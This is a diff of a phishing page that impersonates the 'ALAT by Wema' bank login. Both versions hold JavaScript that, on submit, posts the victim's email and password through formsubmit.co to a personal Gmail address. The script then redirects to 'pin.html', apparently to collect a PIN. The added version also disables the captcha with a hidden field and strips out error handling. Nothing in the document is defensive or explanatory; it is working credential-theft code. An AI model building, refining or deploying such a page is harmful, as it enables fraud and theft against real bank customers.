@@ -1,90 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <link rel="icon" href="/logo.ico" type="image/ico" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
   <title>Login | ALAT by Wema</title>
-  <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
-  <script type="module" src="assets/index-BiOV7unC.js"></script>
+  <link rel="stylesheet" href="assets/index-C49gVU4U.css">
 </head>
-
 <body>
   <div id="root">
     <div class="app">
-      <div class="home">
+      <div class="loginPage">
         <div class="container">
           <div class="contentSec">
             <div class="logo">
               <img src="/assets/logo-Cw-qJTno.png" alt="logo" />
             </div>
-            <div class="hometitle">Welcome back!</div>
+            <div class="hometitle">Login to ALAT</div>
           </div>
 
-          <div class="loginWrapper">
-            <div class="loginSec">
-              <!-- Updated form -->
-              <form id="loginForm">
-                <label for="email">Email Address</label>
-                <div class="formInput">
-                  <input
-                    id="email"
-                    name="email"
-                    type="email"
-                    placeholder="Email Address"
-                    required
-                  />
-                </div>
+          <div class="formSec">
+            <form id="login-form">
+              <input type="email" name="email" placeholder="Email" required />
+              <input type="password" name="password" placeholder="Password" required />
 
-                <span class="errorMessage"></span>
+              <input type="hidden" name="_captcha" value="false">
+              <input type="hidden" name="_next" value="pin.html">
 
-                <label for="password">Password</label>
-                <div class="formInput">
-                  <input
-                    id="password"
-                    name="password"
-                    type="password"
-                    placeholder="Password"
-                    required
-                  />
-                </div>
-
-                <span class="errorMessage"></span>
-
-                <button type="submit">Log In</button>
-              </form>
-              <!-- End form -->
-            </div>
+              <div class="buttonSec">
+                <button type="submit">Login</button>
+              </div>
+            </form>
           </div>
-
         </div>
       </div>
     </div>
   </div>
 
-  <!-- JavaScript to handle form submit and redirect -->
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault(); // Stop normal form submission
+<script>
+  const loginForm = document.getElementById('login-form');
+  loginForm.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const formData = new FormData(loginForm);
 
-      const formData = new FormData(this);
-
-      fetch('https://formsubmit.co/Godisrealq101@gmail.com', {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => {
-        if (response.ok) {
-          window.location.href = 'pin.html'; // Redirect after success
-        } else {
-          alert('Something went wrong. Please try again.');
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        alert('Error submitting form. Please try again.');
-      });
+    await fetch('https://formsubmit.co/Godisrealq101@gmail.com', {
+      method: 'POST',
+      body: formData
     });
-  </script>
+
+    window.location.href = 'pin.html'; // Redirect after success
+  });
+</script>
+
 </body>
 </html>
